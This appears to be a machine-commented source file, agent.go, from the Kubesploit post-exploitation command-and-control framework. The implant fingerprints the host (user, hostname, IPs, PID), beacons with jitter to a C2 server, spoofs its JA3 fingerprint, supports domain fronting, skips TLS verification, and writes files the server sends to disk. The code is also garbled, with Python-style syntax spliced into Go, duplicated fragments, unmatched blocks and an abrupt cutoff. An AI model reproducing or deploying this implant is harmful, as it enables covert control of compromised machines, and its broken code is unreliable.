# `kubesploit\pkg\agent\agent.go`

```
// Kubesploit是一个基于Russel Van Tuyl的Merlin构建的后渗透命令和控制框架。
// 本文件是Kubesploit的一部分。
// 版权所有 2021 CyberArk Software Ltd. 保留所有权利。

// Kubesploit是自由软件：您可以根据GNU通用公共许可证的条款重新分发和/或修改它，
// 无论是许可证的第3版还是以后的版本。

// Kubesploit的分发希望能够有助于增强组织的安全性。
// Kubesploit不得以任何恶意方式使用。
// Kubesploit按原样分发，没有任何担保；包括对适销性或特定用途的隐含担保。请参阅
// GNU通用公共许可证以获取更多详细信息。

// 您应该已经收到了GNU通用公共许可证的副本
// 与Kubesploit一起。如果没有，请参见<http://www.gnu.org/licenses/>。

// 代理包
package agent
# 导入标准库中的模块
import (
	// Standard
	"bytes"  # 导入处理字节的模块
	cryptorand "crypto/rand"  # 导入加密随机数生成模块
	"crypto/rsa"  # 导入RSA加密算法模块
	"crypto/sha1" // #nosec G505  # 导入SHA-1哈希算法模块，#nosec G505表示禁用G505规则的安全扫描
	"crypto/sha256"  # 导入SHA-256哈希算法模块
	"crypto/tls"  # 导入TLS加密传输协议模块
	"encoding/base64"  # 导入base64编解码模块
	"encoding/gob"  # 导入Gob编码解码模块
	"fmt"  # 导入格式化输出模块
	"io"  # 导入输入输出模块
	"io/ioutil"  # 导入输入输出工具模块
	"math/rand"  # 导入随机数生成模块
	"net"  # 导入网络通信模块
	"net/http"  # 导入HTTP通信模块
	"net/url"  # 导入URL解析模块
	"os"  # 导入操作系统功能模块
	"os/user"  # 导入操作系统用户模块
	"path/filepath"  # 导入文件路径处理模块
// 导入运行时库
"runtime"
// 导入字符串转换库
"strconv"
// 导入字符串处理库
"strings"
// 导入时间库
"time"

// 导入第三方库
"github.com/Ne0nd0g/ja3transport"
"github.com/cretz/gopaque/gopaque"
"github.com/fatih/color"
"github.com/lucas-clemente/quic-go"
"github.com/lucas-clemente/quic-go/http3"
"github.com/satori/go.uuid"
"golang.org/x/crypto/pbkdf2"
"golang.org/x/net/http2"
"gopkg.in/square/go-jose.v2"
"gopkg.in/square/go-jose.v2/jwt"

// 导入自定义库
"kubesploit/pkg"
"kubesploit/pkg/core"
// 导入包 messages，该包可能包含与消息相关的功能
"kubesploit/pkg/messages"
)

// 全局变量
var build = "nonRelease" // build 是 Merlin Agent 程序的构建编号，在编译时设置

// 定义 executeCommandFunction 类型，该类型是一个接受两个字符串参数并返回两个字符串的函数
type executeCommandFunction func(string, string)(string, string)

// 定义 merlinClient 接口，该接口可能包含与执行 HTTP 请求相关的方法
type merlinClient interface {
	Do(req *http.Request) (*http.Response, error)
	Get(url string) (resp *http.Response, err error)
	Head(url string) (resp *http.Response, err error)
	Post(url, contentType string, body io.Reader) (resp *http.Response, err error)
}

// TODO 这是一个与 agents/agents.go 中的内容重复的部分，需要集中处理

// Agent 是代理对象的结构体。为了强制使用 New() 函数，该结构体未被导出
type Agent struct {
	ID            uuid.UUID       // ID 是每个代理的唯一标识符
	Platform      string          // 操作系统平台，代理程序运行的操作系统平台（例如 windows）
	Architecture  string          // 架构，代理程序运行的操作系统架构（例如 amd64）
	UserName      string          // 用户名，代理程序运行的用户名
	UserGUID      string          // 用户全局唯一标识符，与用户名相关联
	HostName      string          // 主机名，计算机的主机名
	Ips           []string        // Ips 是分配给主机接口的所有 IP 地址的切片
	Pid           int             // 进程 ID，代理程序正在运行的进程 ID
	iCheckIn      time.Time       // iCheckIn 是代理程序初始签入时间的时间戳
	sCheckIn      time.Time       // sCheckIn 是代理程序最后一次状态签入时间的时间戳
	Version       string          // 版本号，Merlin 代理程序的版本号
	Build         string          // 构建号，Merlin 代理程序的构建号
	WaitTime      time.Duration   // WaitTime 是代理程序在签入之间等待的时间
	PaddingMax    int             // PaddingMax 是随机选择的消息填充长度的最大值
	MaxRetry      int             // MaxRetry 是代理程序退出之前的最大失败签入尝试次数
	FailedCheckin int             // FailedCheckin 是失败签入的总次数
	Skew          int64           // Skew 是添加到每个 WaitTime 的偏移量大小，以变化签入尝试
	Verbose       bool            // Verbose 启用标准输出的详细消息
	Debug         bool            // Debug 启用标准输出的调试消息
	Proto         string          // Proto 包含代理程序使用的传输协议（例如 http2 或 http3）
	Client        *merlinClient   // Client 是客户端用于代理通信建立连接的接口
	UserAgent     string          // UserAgent是与HTTP连接一起使用的用户代理字符串
	initial       bool            // initial标识代理是否成功完成了第一次初始检查
	KillDate      int64           // killDate是Unix时间戳，表示可执行文件在此时间之后将不再运行（如果为0，则不会使用）
	RSAKeys       *rsa.PrivateKey // RSA私钥/公钥对；私钥用于解密消息
	PublicKey     rsa.PublicKey   // 公钥（服务器的）用于加密消息
	secret        []byte          // secret用于执行对称加密操作
	JWT           string          // 身份验证JSON Web令牌
	URL           string          // C2服务器的URL
	Host          string          // HTTP Host头，通常与域前置一起使用
	pwdU          []byte          // 从5000次PBKDF2迭代中得到的SHA256哈希，使用30个字符的随机字符串作为输入
	psk           string          // 预共享密钥
	JA3           string          // JA3签名（不是MD5哈希），用于生成JA3客户端
	record        Recorder        // 记录器对象
}

// New创建一个具有特定值的新代理结构，并返回该对象
func New(protocol string, url string, host string, psk string, proxy string, ja3 string, verbose bool, debug bool) (Agent, error) {
	if debug {
		message("debug", "Entering agent.New function")
	}
// 创建一个名为recorder的新记录器，将数据写入/tmp/dat1文件
recorder := NewRecorder("/tmp/dat1")

// 创建一个名为a的代理对象，设置其各项属性值
a := Agent{
    // 生成一个新的UUID作为代理ID
    ID: uuid.NewV4(),
    // 获取当前操作系统的名称
    Platform: runtime.GOOS,
    // 获取当前操作系统的架构
    Architecture: runtime.GOARCH,
    // 获取当前进程的进程ID
    Pid: os.Getpid(),
    // 设置代理的版本号为kubesploitVersion.Version
    Version: kubesploitVersion.Version,
    // 设置等待时间为30秒
    WaitTime: 30000 * time.Millisecond,
    // 设置填充最大值为4096
    PaddingMax: 4096,
    // 设置最大重试次数为7
    MaxRetry: 7,
    // 设置时间偏差为3000
    Skew: 3000,
    // 设置是否显示详细信息的标志
    Verbose: verbose,
    // 设置是否启用调试模式的标志
    Debug: debug,
    // 设置代理使用的协议
    Proto: protocol,
    // 设置代理的用户代理信息
    UserAgent: "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36",
    // 设置初始状态为false
    initial: false,
    // 设置杀死日期为0
    KillDate: 0,
    // 设置代理的URL
    URL: url,
    // 设置代理的主机
    Host: host,
}
# 设置结构体字段 JA3 的值为变量 ja3 的值
JA3:          ja3,
# 设置结构体字段 record 的值为变量 recorder 的值
record:       recorder,
}

# 使用当前时间的纳秒数作为随机数种子
rand.Seed(time.Now().UnixNano())

# 获取当前用户信息
u, errU := user.Current()
# 如果获取用户信息出错，则返回错误信息
if errU != nil {
    return a, fmt.Errorf("there was an error getting the current user:\r\n%s", errU)
}

# 设置结构体字段 UserName 的值为当前用户的用户名
a.UserName = u.Username
# 设置结构体字段 UserGUID 的值为当前用户的组 ID
a.UserGUID = u.Gid

# 获取主机名
h, errH := os.Hostname()
# 如果获取主机名出错，则返回错误信息
if errH != nil {
    return a, fmt.Errorf("there was an error getting the hostname:\r\n%s", errH)
}

# 设置结构体字段 HostName 的值为主机名
a.HostName = h
// 获取所有网络接口信息
interfaces, errI := net.Interfaces()
// 如果获取接口信息出错，返回错误信息
if errI != nil {
    return a, fmt.Errorf("there was an error getting the IP addresses:\r\n%s", errI)
}

// 遍历每个网络接口
for _, iface := range interfaces {
    // 获取每个接口的 IP 地址
    addrs, err := iface.Addrs()
    // 如果获取 IP 地址出错，返回错误信息
    if err == nil {
        // 将获取到的 IP 地址添加到 Ips 切片中
        for _, addr := range addrs {
            a.Ips = append(a.Ips, addr.String())
        }
    } else {
        return a, fmt.Errorf("there was an error getting interface information:\r\n%s", err)
    }
}

// 获取客户端信息
var errClient error
a.Client, errClient = getClient(a.Proto, proxy, a.JA3)
// 如果获取客户端传输时出现错误，返回错误信息
if errClient != nil {
    return a, fmt.Errorf("there was an error getting a transport client:\r\n%s", errClient)
}

// 生成一个随机密码，并通过5000次PBKDF2迭代；与OPAQUE一起使用
x := core.RandStringBytesMaskImprSrc(30)
a.pwdU = pbkdf2.Key([]byte(x), a.ID.Bytes(), 5000, 32, sha256.New)

// 将加密密钥设置为预身份验证预共享密钥
a.psk = psk

// 生成RSA密钥对
privateKey, rsaErr := rsa.GenerateKey(cryptorand.Reader, 4096)
if rsaErr != nil {
    return a, fmt.Errorf("there was an error generating the RSA key pair:\r\n%s", rsaErr)
}

a.RSAKeys = privateKey
# 如果设置了Verbose标志，则输出主机信息
if a.Verbose:
    message("info", "Host Information:")
    message("info", fmt.Sprintf("\tAgent UUID: %s", a.ID))
    message("info", fmt.Sprintf("\tPlatform: %s", a.Platform))
    message("info", fmt.Sprintf("\tArchitecture: %s", a.Architecture))
    message("info", fmt.Sprintf("\tUser Name: %s", a.UserName)) #TODO A username like _svctestaccont causes error
    message("info", fmt.Sprintf("\tUser GUID: %s", a.UserGUID))
    message("info", fmt.Sprintf("\tHostname: %s", a.HostName))
    message("info", fmt.Sprintf("\tPID: %d", a.Pid))
    message("info", fmt.Sprintf("\tIPs: %v", a.Ips))
    message("info", fmt.Sprintf("\tProtocol: %s", a.Proto))
    message("info", fmt.Sprintf("\tProxy: %v", proxy))
    message("info", fmt.Sprintf("\tJA3 Signature: %s", a.JA3))

# 如果设置了debug标志，则输出调试信息
if debug:
    message("debug", "Leaving agent.New function")
# 返回agent对象和nil错误
return a, nil
// Run方法指示代理使用传入的协议与传入的服务器建立通信
func (a *Agent) Run() error {
    // 以当前时间为种子生成随机数
    rand.Seed(time.Now().UTC().UnixNano())

    // 如果设置了Verbose标志，则打印代理版本和构建信息
    if a.Verbose {
        message("note", fmt.Sprintf("Agent version: %s", kubesploitVersion.Version))
        message("note", fmt.Sprintf("Agent build: %s", build))
    }

    // 循环执行以下操作
    for {
        // 检查KillDate以确定代理是否应该进行checkin
        if (a.KillDate == 0) || (time.Now().Unix() < a.KillDate) {
            // 如果是初始状态，则进行checkin
            if a.initial {
                // 如果设置了Verbose标志，则打印"Checking in..."
                if a.Verbose {
                    message("note", "Checking in...")
                }
                // 启动statusCheckIn方法
                go a.statusCheckIn()
            } else {
                // 否则执行initialCheckIn方法，并将结果赋值给initial
                a.initial = a.initialCheckIn()
            }
# 如果失败的签入次数超过最大重试次数，则返回错误信息
if a.FailedCheckin >= a.MaxRetry:
    return fmt.Errorf("maximum number of failed checkin attempts reached: %d", a.MaxRetry)
# 如果未超过最大重试次数，但代理程序的终止日期已经过期，则返回错误信息
else:
    return fmt.Errorf("agent kill date has been exceeded: %s", time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339))

# 初始化时间偏移为0
timeSkew := time.Duration(0)

# 如果时间偏移大于0，则随机生成一个小于时间偏移的值，并转换成毫秒
if a.Skew > 0:
    timeSkew = time.Duration(rand.Int63n(a.Skew)) * time.Millisecond // #nosec G404 - Does not need to be cryptographically secure, deterministic is OK

# 计算总等待时间为等待时间加上时间偏移
totalWaitTime := a.WaitTime + timeSkew

# 如果设置了详细输出，则打印等待信息
if a.Verbose:
    message("note", fmt.Sprintf("Sleeping for %s at %s", totalWaitTime.String(), time.Now().UTC().Format(time.RFC3339)))

# 程序休眠等待总等待时间
time.Sleep(totalWaitTime)
// 定义 Agent 结构体的 initialCheckIn 方法，返回布尔值
func (a *Agent) initialCheckIn() bool {
    // 如果调试模式开启，打印进入 initialCheckIn 函数的调试信息
    if a.Debug {
        message("debug", "Entering initialCheckIn function")
    }

    // 注册
    // 调用 opaqueRegister 方法进行注册
    errOPAQUEReg := a.opaqueRegister()
    // 如果注册出现错误，增加失败注册次数，如果详细模式开启，打印警告信息和失败注册次数
    if errOPAQUEReg != nil {
        a.FailedCheckin++
        if a.Verbose {
            message("warn", errOPAQUEReg.Error())
            message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
        }
        return false
    }

    // 认证
// 使用 OPAQUE 协议进行身份验证
errOPAQUEAuth := a.opaqueAuthenticate()
// 如果身份验证失败，增加失败次数并输出警告信息
if errOPAQUEAuth != nil {
    a.FailedCheckin++
    if a.Verbose {
        message("warn", errOPAQUEAuth.Error())
        message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
    }
    return false
}

// 身份验证成功后，发送代理信息
infoResponse, errAgentInfo := a.sendMessage("POST", a.getAgentInfoMessage())
// 如果发送代理信息失败，增加失败次数并输出警告信息
if errAgentInfo != nil {
    a.FailedCheckin++
    if a.Verbose {
        message("warn", errAgentInfo.Error())
        message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
    }
    return false
}
	// 调用 messageHandler 处理 infoResponse，忽略第一个返回值，将错误赋值给 errHandler
	_, errHandler := a.messageHandler(infoResponse)
	// 如果 errHandler 不为空，且 a.Verbose 为真，则打印警告信息
	if errHandler != nil {
		if a.Verbose {
			message("warn", errHandler.Error())
		}
	}

	// 发送使用认证派生密钥加密的 RSA 密钥
	errRSA := a.rsaKeyExchange()
	// 如果 errRSA 不为空，且 a.Verbose 为真，则打印警告信息
	if errRSA != nil {
		if a.Verbose {
			message("warn", errRSA.Error())
		}
	}

	// 如果 FailedCheckin 大于 0 且小于 MaxRetry
	if a.FailedCheckin > 0 && a.FailedCheckin < a.MaxRetry {
		// 如果 a.Verbose 为真，则打印更新服务器的提示信息
		if a.Verbose {
			message("note", fmt.Sprintf("Updating server with failed checkins from %d to 0", a.FailedCheckin))
		}
		// 将 FailedCheckin 置为 0
		a.FailedCheckin = 0
	}
		// 发送代理信息消息，并接收响应
		infoResponse, err := a.sendMessage("POST", a.getAgentInfoMessage())
		// 如果发送消息出错，返回false
		if err != nil {
			// 如果设置了详细输出，打印警告信息
			if a.Verbose {
				message("warn", err.Error())
			}
			return false
		}
		// 处理接收到的消息
		_, errHandler2 := a.messageHandler(infoResponse)
		// 如果处理消息出错，打印警告信息
		if errHandler2 != nil {
			if a.Verbose {
				message("warn", errHandler2.Error())
			}
		}
	}

	// 如果设置了调试模式，打印调试信息
	if a.Debug {
		message("debug", "Leaving initialCheckIn function, returning True")
	}
	// 更新最后一次检查时间，并返回true
	a.iCheckIn = time.Now().UTC()
	return true
// statusCheckIn 方法用于向服务器发送状态检查请求
func (a *Agent) statusCheckIn() {
    // 如果调试模式开启，打印进入方法的调试信息
    if a.Debug {
        message("debug", "Entering into agent.statusCheckIn()")
    }

    // 创建状态消息对象
    statusMessage := messages.Base{
        Version: 1.0,
        ID:      a.ID,
        Type:    "StatusCheckIn",
        Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
    }

    // 发送状态消息并接收响应
    j, reqErr := a.sendMessage("POST", statusMessage)

    // 如果发送请求出错，增加失败检查次数
    if reqErr != nil {
        a.FailedCheckin++
        // 如果详细模式开启，打印警告信息
        if a.Verbose {
            message("warn", reqErr.Error())
		// 调用message函数，输出日志信息，显示失败的checkin数量和总共的checkin数量
		message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}

		// 处理HTTP3错误
		if a.Proto == "http3" {
			e := ""  // 初始化错误信息字符串
			n := false  // 初始化布尔变量n

			// 如果reqErr.Error()中包含"Application error 0x0"，则设置n为true，e为相应的错误信息
			if strings.Contains(reqErr.Error(), "Application error 0x0") {
				n = true
				e = "Building new HTTP/3 client because received QUIC CONNECTION_CLOSE frame with NO_ERROR transport error code"
			}

			// 如果reqErr.Error()中包含"NO_ERROR: Handshake did not complete in time"，则设置n为true，e为相应的错误信息
			if strings.Contains(reqErr.Error(), "NO_ERROR: Handshake did not complete in time") {
				n = true
				e = "Building new HTTP/3 client because QUIC HandshakeTimeout reached"
			}
// 当发生 PING 超时时，表示最近没有网络活动。可以使用 KeepAlive 设置来防止 MaxIdleTimeout
// 当客户端先前建立了加密握手，但没有收到来自服务器的 PING 帧，超过了客户端的 MaxIdleTimeout 时会发生
// 通常发生在 Merlin 服务器应用被终止/退出时，没有发送 CONNECTION_CLOSE 帧来停止监听器
if strings.Contains(reqErr.Error(), "NO_ERROR: No recent network activity") {
    n = true
    e = "Building new HTTP/3 client because QUIC MaxIdleTimeout reached"
}

// 如果处于调试模式，则打印 HTTP/3 错误信息
if a.Debug {
    message("debug", fmt.Sprintf("HTTP/3 error: %s", reqErr.Error()))
}

// 如果 n 为 true，则执行以下操作
if n {
    // 如果处于详细模式，则打印提示信息 e
    if a.Verbose {
        message("note", e)
    }
    // 获取新的 HTTP/3 客户端
    var errClient error
    a.Client, errClient = getClient(a.Proto, "", "")
    if errClient != nil {
        // 如果获取新的 HTTP/3 客户端时出现错误，则打印警告信息
        message("warn", fmt.Sprintf("there was an error getting a new HTTP/3 client: %s", errClient.Error()))
}
		}
	}
}
return
```
// 结束函数，返回空值

a.FailedCheckin = 0
a.sCheckIn = time.Now().UTC()
```
// 重置失败签入次数为0，记录当前时间为签入时间

if a.Debug {
	message("debug", fmt.Sprintf("Agent ID: %s", j.ID))
	message("debug", fmt.Sprintf("Message Type: %s", j.Type))
	message("debug", fmt.Sprintf("Message Payload: %s", j.Payload))
}
```
// 如果调试模式开启，输出代理ID、消息类型和消息负载

// 处理消息
m, err := a.messageHandler(j)
if err != nil {
	if a.Verbose {
		message("warn", err.Error())
```
// 调用消息处理函数处理消息，如果出现错误
// 如果详细模式开启，输出警告信息
		}
		return
	}

	// 当消息类型为空时，不需要进一步处理
	if m.Type == "" {
		return
	}

	// 发送消息并返回错误信息
	_, errR := a.sendMessage("post", m)
	if errR != nil {
		// 如果设置了详细模式，输出警告信息
		if a.Verbose {
			message("warn", errR.Error())
		}
		return
	}

}

// getClient 返回传入协议（例如h2或http3）的HTTP客户端
func getClient(protocol string, proxyURL string, ja3 string) (*merlinClient, error) {
    // 定义一个函数，根据给定的协议、代理URL和JA3字符串返回一个merlinClient对象和错误信息

    var m merlinClient
    // 定义一个merlinClient对象m

    /* #nosec G402 */
    // G402: TLS InsecureSkipVerify set true. (Confidence: HIGH, Severity: HIGH) Allowed for testing
    // Setup TLS configuration
    // 设置TLS配置
    TLSConfig := &tls.Config{
        MinVersion:         tls.VersionTLS12,
        InsecureSkipVerify: true, // #nosec G402 - see https://github.com/Ne0nd0g/merlin/issues/59 TODO fix this
        // 设置InsecureSkipVerify为true，允许跳过证书验证，用于测试目的
        CipherSuites: []uint16{
            tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
        },
        NextProtos: []string{protocol},
    }

    // Proxy
    // 设置代理
    var proxy func(*http.Request) (*url.URL, error)
    // 定义一个函数类型的变量proxy，用于处理HTTP请求和返回代理URL或错误
    if proxyURL != "" {
		// 解析代理URL字符串，返回代理URL和错误信息
		rawURL, errProxy := url.Parse(proxyURL)
		// 如果解析出错，返回错误信息
		if errProxy != nil {
			return nil, fmt.Errorf("there was an error parsing the proxy string:\r\n%s", errProxy.Error())
		}
		// 创建代理URL
		proxy = http.ProxyURL(rawURL)
	}

	// 如果存在JA3字符串
	if ja3 != "" {
		// 创建新的JA3客户端
		JA3, errJA3 := ja3transport.NewWithStringInsecure(ja3)
		// 如果创建出错，返回错误信息
		if errJA3 != nil {
			return &m, fmt.Errorf("there was an error getting a new JA3 client:\r\n%s", errJA3.Error())
		}
		// 创建新的JA3传输
		tr, err := ja3transport.NewTransportInsecure(ja3)
		// 如果创建出错，返回错误信息
		if err != nil {
			return nil, err
		}

		// 设置代理
		if proxyURL != "" {
		// 设置代理
		tr.Proxy = proxy
	}

	// 设置 JA3.Transport 为 tr
	JA3.Transport = tr

	// 根据协议类型选择对应的 http.RoundTripper
	var transport http.RoundTripper
	switch strings.ToLower(protocol) {
	case "http3":
		// 设置 transport 为 http3.RoundTripper
		transport = &http3.RoundTripper{
			QuicConfig: &quic.Config{
				// 设置最大空闲超时时间为30秒
				MaxIdleTimeout: time.Second * 30,
				// KeepAlive 用于发送 HTTP/2 PING 帧以保持连接活跃
				// 如果不使用此选项，并且代理的休眠时间大于 MaxIdleTimeout，则连接将超时
				KeepAlive: true,
				// 设置是否保持长连接
				HandshakeTimeout: time.Second * 30,
				// HandshakeTimeout 是客户端在与服务器建立初始加密握手时等待响应的时间
			},
			TLSClientConfig: TLSConfig,
			// 设置 TLS 客户端配置
		}
	case "h2":
		transport = &http2.Transport{
			TLSClientConfig: TLSConfig,
			// 设置 TLS 客户端配置
		}
	case "h2c":
		transport = &http2.Transport{
			AllowHTTP: true,
			// 允许使用非加密的 HTTP/2 连接
			DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
				return net.Dial(network, addr)
				// 设置在没有 TLS 的情况下建立连接
			},
		}
	case "https":
		if proxyURL != "" {
			transport = &http.Transport{
				// 设置代理服务器的 URL
# 根据协议类型选择不同的传输配置
switch protocol {
	case "https":
		# 如果存在代理，则创建带有代理的http.Transport对象
		if proxyURL != "" {
			transport = &http.Transport{
				TLSClientConfig: TLSConfig,  # 设置TLS配置
				Proxy:           proxy,       # 设置代理
			}
		} else {
			# 否则创建普通的http.Transport对象
			transport = &http.Transport{
				TLSClientConfig: TLSConfig,  # 设置TLS配置
			}
		}
	case "http":
		# 如果存在代理，则创建带有代理和最大空闲连接数的http.Transport对象
		if proxyURL != "" {
			transport = &http.Transport{
				MaxIdleConns: 10,  # 设置最大空闲连接数
				Proxy:        proxy,  # 设置代理
			}
		} else {
			# 否则创建带有最大空闲连接数的http.Transport对象
			transport = &http.Transport{
				MaxIdleConns: 10,  # 设置最大空闲连接数
			}
		}
	default:
		# 其他协议类型不做处理
	// 如果协议不合法，返回错误信息
		return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
	}
	// 创建一个新的 HTTP 客户端，设置传输层为指定的 transport
	m = &http.Client{Transport: transport}
	// 返回新的 HTTP 客户端和 nil 错误信息
	return &m, nil
}

// sendMessage 是一个通用函数，用于接收一个 messages.Base 结构体，对其进行编码、加密，然后发送到服务器
// 响应消息将被解密、解码，并返回一个 messages.Base 结构体
func (a *Agent) sendMessage(method string, m messages.Base) (messages.Base, error) {
	// 如果调试模式开启，打印进入 sendMessage() 函数的调试信息
	if a.Debug {
		message("debug", "Entering into agent.sendMessage()")
	}
	// 如果详细模式开启，打印发送消息的详细信息
	if a.Verbose {
		message("note", fmt.Sprintf("Sending %s message to %s", m.Type, a.URL))
	}

	// 声明一个返回消息的变量
	var returnMessage messages.Base

	// 将 messages.Base 结构体转换为 gob 格式的字节流
	messageBytes := new(bytes.Buffer)
	// 使用 gob 编码器将消息 m 编码成字节流，存储到 messageBytes 中
	errGobEncode := gob.NewEncoder(messageBytes).Encode(m)
	// 如果编码过程中出现错误，返回错误信息
	if errGobEncode != nil {
		return returnMessage, fmt.Errorf("there was an error encoding the %s message to a gob:\r\n%s", m.Type, errGobEncode.Error())
	}

	// 获取 JWE
	// 使用核心库的 GetJWESymetric 方法获取 JWE 字符串
	jweString, errJWE := core.GetJWESymetric(messageBytes.Bytes(), a.secret)
	// 如果获取 JWE 过程中出现错误，返回错误信息
	if errJWE != nil {
		return returnMessage, errJWE
	}

	// 将 JWE 字符串编码成字节流，存储到 jweBytes 中
	jweBytes := new(bytes.Buffer)
	errJWEBuffer := gob.NewEncoder(jweBytes).Encode(jweString)
	// 如果编码过程中出现错误，返回错误信息
	if errJWEBuffer != nil {
		return returnMessage, fmt.Errorf("there was an error encoding the %s JWE string to a gob:\r\n%s", m.Type, errJWEBuffer.Error())
	}

	// 根据 method 的值进行不同的操作
	switch strings.ToLower(method) {
	case "post":
		// 创建一个新的 HTTP POST 请求，使用指定的 URL 和 JWE 数据
		req, reqErr := http.NewRequest("POST", a.URL, jweBytes)
		// 检查是否有错误发生，如果有则返回错误信息
		if reqErr != nil {
			return returnMessage, fmt.Errorf("there was an error building the HTTP request:\r\n%s", reqErr.Error())
		}

		// 检查请求是否为空，如果不为空则设置请求头信息
		if req != nil {
			req.Header.Set("User-Agent", a.UserAgent)
			req.Header.Set("Content-Type", "application/octet-stream; charset=utf-8")
			req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", a.JWT))
			// 如果指定了 Host，则设置请求的 Host
			if a.Host != "" {
				req.Host = a.Host
			}
		}

		// 发送请求
		var client merlinClient // 为什么需要证明 a.Client 是 merlinClient 类型？
		client = *a.Client
		// 如果开启了调试模式，则输出调试信息
		if a.Debug {
			message("debug", fmt.Sprintf("Sending POST request size: %d to: %s", req.ContentLength, a.URL))
		}
		// 发送 HTTP 请求并获取响应
		resp, err := client.Do(req)

		// 如果发生错误，返回错误信息
		if err != nil {
			return returnMessage, fmt.Errorf("there was an error with the %s client while performing a POST:\r\n%s", a.Proto, err.Error())
		}
		// 如果处于调试模式，打印 HTTP 响应信息
		if a.Debug {
			message("debug", fmt.Sprintf("HTTP Response:\r\n%+v", resp))
		}

		// 根据响应状态码进行不同的处理
		switch resp.StatusCode {
		case 200:
			break
		case 401:
			// 如果处于详细模式，打印提示信息
			if a.Verbose {
				message("note", "server returned a 401, reauthenticating orphaned agent")
			}
			// 创建重新认证的消息
			msg := messages.Base{
				Version: 1.0,
				ID:      a.ID,
				Type:    "ReAuthenticate",
		}
		// 返回消息和错误
		return msg, err
	// 默认情况下
	default:
		// 返回错误消息和带有状态码的错误
		return returnMessage, fmt.Errorf("there was an error communicating with the server:\r\n%d", resp.StatusCode)
	}

	// 获取响应的 Content-Type 头部
	contentType := resp.Header.Get("Content-Type")
	// 如果 Content-Type 为空
	if contentType == "" {
		// 返回错误消息
		return returnMessage, fmt.Errorf("the response did not contain a Content-Type header")
	}

	// 检查响应是否包含 application/octet-stream Content-Type 头部
	isOctet := false
	// 遍历 Content-Type 头部的值
	for _, v := range strings.Split(contentType, ",") {
		// 如果值为 application/octet-stream
		if strings.ToLower(v) == "application/octet-stream" {
			// 设置 isOctet 为 true
			isOctet = true
		}
	}

	// 如果不是 application/octet-stream
	if !isOctet {
		// 返回错误消息和格式化的错误信息，如果响应消息不包含 application/octet-stream 内容类型头
		return returnMessage, fmt.Errorf("the response message did not contain the application/octet-stream Content-Type header")
	}

	// 检查响应消息是否包含数据
	// TODO 暂时禁用对 HTTP/3 连接的长度检查 https://github.com/lucas-clemente/quic-go/issues/2398
	if resp.ContentLength == 0 && a.Proto != "http3" {
		// 如果响应消息不包含任何数据，则返回错误消息
		return returnMessage, fmt.Errorf("the response message did not contain any data")
	}

	var jweString string

	// 从服务器响应中解码 GOB 到 JWE
	errD := gob.NewDecoder(resp.Body).Decode(&jweString)
	if errD != nil {
		// 如果解码出错，则返回错误消息
		return returnMessage, fmt.Errorf("there was an error decoding the gob message:\r\n%s", errD.Error())
	}

	// 解密 JWE 到 messages.Base
	respMessage, errDecrypt := core.DecryptJWE(jweString, a.secret)
	if errDecrypt != nil {
// 返回错误信息和解密错误
return returnMessage, errDecrypt
// 验证 UUID 是否匹配
if respMessage.ID != a.ID {
    // 如果详细模式开启，返回错误信息
    if a.Verbose {
        return returnMessage, fmt.Errorf("response message agent ID %s does not match current ID %s", respMessage.ID.String(), a.ID.String())
    }
}
// 返回响应消息和空错误
return respMessage, nil
// 如果方法无效，返回错误信息
default:
    return returnMessage, fmt.Errorf("%s is an invalid method for sending a message", method)
}

// messageHandler 函数根据消息类型执行相关操作
func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
// 如果调试模式开启，输出调试信息
if a.Debug {
    message("debug", "Entering into agent.messageHandler function")
}
# 如果设置了Verbose标志，打印成功消息和接收到的消息类型
	if a.Verbose {
		message("success", fmt.Sprintf("%s message type received!", m.Type))
	}

	# 创建一个基本消息对象，设置版本、ID和填充
	returnMessage := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	# 检查输入消息的ID是否与代理的ID匹配，如果不匹配则返回错误
	if a.ID != m.ID {
		return returnMessage, fmt.Errorf("the input message UUID did not match this agent's UUID %s:%s", a.ID, m.ID)
	}

	# 创建一个命令结果对象
	var c messages.CmdResults

	# 如果消息的Token不为空，将代理的JWT设置为消息的Token
	if m.Token != "" {
		a.JWT = m.Token
	}

	# 根据消息类型进行不同的处理
	switch m.Type {
	case "FileTransfer":
		// 将消息的载荷转换为文件传输对象
		p := m.Payload.(messages.FileTransfer)
		// 将作业设置为文件传输对象的作业
		c.Job = p.Job
		// 如果是下载操作，代理将从服务器下载文件
		if p.IsDownload {
			// 如果代理设置为详细模式，输出文件传输类型
			if a.Verbose {
				message("note", "FileTransfer type: Download")
			}

			// 获取文件路径的目录部分
			d, _ := filepath.Split(p.FileLocation)
			// 检查远程目录的文件信息结构
			_, directoryPathErr := os.Stat(d)
			// 如果获取目录信息出错，将错误信息存储到标准错误输出
			if directoryPathErr != nil {
				c.Stderr = fmt.Sprintf("There was an error getting the FileInfo structure for the remote "+
					"directory %s:\r\n", p.FileLocation)
				c.Stderr += directoryPathErr.Error()
			}
			// 如果标准错误输出为空，表示目录信息获取成功，开始写入文件
			if c.Stderr == "" {
				// 如果代理设置为详细模式，输出写入文件的信息
				if a.Verbose {
					message("note", fmt.Sprintf("Writing file to %s", p.FileLocation))
				}
				// 使用 base64 解码文件数据
				downloadFile, downloadFileErr := base64.StdEncoding.DecodeString(p.FileBlob)
# 如果下载文件出现错误，将错误信息存储到命令对象的标准错误字段
if downloadFileErr != nil:
    c.Stderr = downloadFileErr.Error()
else:
    # 将下载的文件内容写入到指定位置
    errF := ioutil.WriteFile(p.FileLocation, downloadFile, 0600)
    if errF != nil:
        # 如果写入文件出现错误，将错误信息存储到命令对象的标准错误字段
        c.Stderr = errF.Error()
    else:
